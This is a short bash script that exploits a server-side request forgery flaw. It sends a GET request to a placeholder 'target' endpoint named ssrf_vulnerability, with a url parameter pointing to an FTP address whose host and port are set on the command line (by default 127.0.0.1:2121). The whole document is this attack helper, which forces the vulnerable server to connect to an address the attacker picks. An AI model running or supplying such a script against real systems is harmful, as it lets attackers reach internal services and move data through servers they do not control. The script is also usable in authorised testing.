#!/bin/bash
host=${1:-127.0.0.1}
port=${2:-2121}
curl "https://target/ssrf_vulnerability" -G --data-urlencode "url=ftp://${host}:${port}/"